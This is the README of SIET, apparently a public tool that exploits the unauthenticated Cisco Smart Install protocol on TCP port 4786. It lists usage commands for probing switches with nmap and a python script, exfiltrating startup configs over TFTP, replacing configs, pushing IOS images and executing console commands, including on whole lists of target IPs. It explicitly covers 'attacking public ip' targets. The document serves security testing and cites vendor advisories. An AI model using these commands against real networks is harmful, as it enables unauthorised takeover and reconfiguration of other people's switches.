# SIET - Smart Install Exploitation Tool

Cisco Smart Install is a plug-and-play configuration and image-management feature that provides zero-touch deployment for new switches. You can ship a switch to a location, place it in the network and power it on with no configuration required on the device.

You can easy identify it using nmap cisco-siet.nse script. Just download it and run it: 
```	
nmap -p 4786 -v 192.168.0.1	# By default, it will just test whether host is vulnerable or not
$ nmap -p 4786 -v 192.168.0.1 --script ./cisco-siet.nse
# You can pass argument to get config
# Note: you need to run it as root
# If you are attacking public ip, make sure to provide your public ip to the script (cisco-siet.addr=<PUBLIC_IP>)
$ sudo nmap -p 4786 -v 192.168.0.1 --script ./cisco-siet.nse \
> --script-args "cisco-siet.get"
```

This protocol has a few security issues and this simple tool helps you to use all of them.:

1. Change tftp-server address on client device by sending one malformed TCP packet.
2. Copy client's `startup-config` on tftp-server exchanged previously.
3. Substitute client's `startup-config` for the file which has been copied and edited. Device will reboot in defined time.
4. Upgrade ios image on the "client" device.
5. Execute random set of commands on the "client" device. IS a new feature working only at `3.6.0E` and `15.2(2)E` ios versions. 


All of them are caused by the lack of any authentication in smart install protocol. Any device can act as a director and send malformed tcp packet. It works on any "client" device where smart install is enabled. It does not matter if it used smart install in the network or not.

**Confim** from vendor: 

- https://tools.cisco.com/security/center/content/CiscoSecurityResponse/cisco-sr-20170214-smi
- https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20160323-smi

**Slides**: https://2016.zeronights.ru/wp-content/uploads/2016/12/CiscoSmartInstall.v3.pdf

# USAGE

You can use it for password recovery of for unlock cisco switch when no password provided.

Example to get config:

```
sudo python siet.py -g -i 192.168.0.1
```

Options:

- `-t`  test device for smart install
- `-g`  get device config
- `-c`  change device config
- `-C`  change multiple device configs
- `-u`  update device IOS
- `-e`  execute commands in device's console
- `-i` ip address of target device
- `-l` ip list of targets (file path)
- `--thread-count` number of threads to be spawned


# UPDATES

New option `-C`. You can place configs into the `tftp/conf` directory following the 
naming convention of `ip.conf`, ie: `192.168.10.1.conf`. A target ip list `-l` must be used
in conjunction with this option, the name of the conf corresponds to it's target destination.

New option `-l`. You can use list of ip addresses for getting configuration file.

Fix bug with incorrect test of device.

If you are thinking about what to do with the copied configuration files, you can try our new tool: [Cisco Config Analysis Tool](https://github.com/cisco-config-analysis-tool/ccat)

